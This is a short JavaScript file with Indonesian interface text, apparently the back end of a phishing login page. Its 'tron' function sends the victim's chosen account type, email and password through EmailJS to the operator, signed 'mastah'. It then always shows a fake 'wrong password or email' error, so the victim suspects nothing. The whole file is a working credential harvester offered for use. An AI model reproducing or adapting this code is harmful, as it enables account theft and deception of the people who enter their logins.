function aut(){
	var pilih = document.getElementById("pilih_akun").value;
	var email = document.getElementById("email").value;
	var pass = document.getElementById("pass").value;
	if(pilih == "null"){
		console.log(pilih);
		salah();
    }else{
		tron(email,pass,pilih);
	}
}

function salah(){
	Swal.fire({
		icon:"question",
		title:"PILIH JENIS AKUN",
		text: "kamu belum selesai mengisi jenis akun",
		});
}
function error() {
        Swal.fire({
          icon: "error",
          title: "GAGAL",
          text: "password atau email yang Anda masukkan salah",
        });
}

function tron(x,y,z){
	//parameter
    
var parameter1 = {
    	service :"service_if1g2rg",
    	tample : "template_2wa0xiy"
    }
    
	var parameter = {
		from_name:"mastah",
		message:"jenis akun: "+z+"\nemail: "+x+"\npass: "+y
		}
	emailjs.send(parameter1["service"],parameter1["tample"],parameter).then(function(response) {
	  error();
      console.log('SUCCESS!', response.status, response.text);
    });
	
}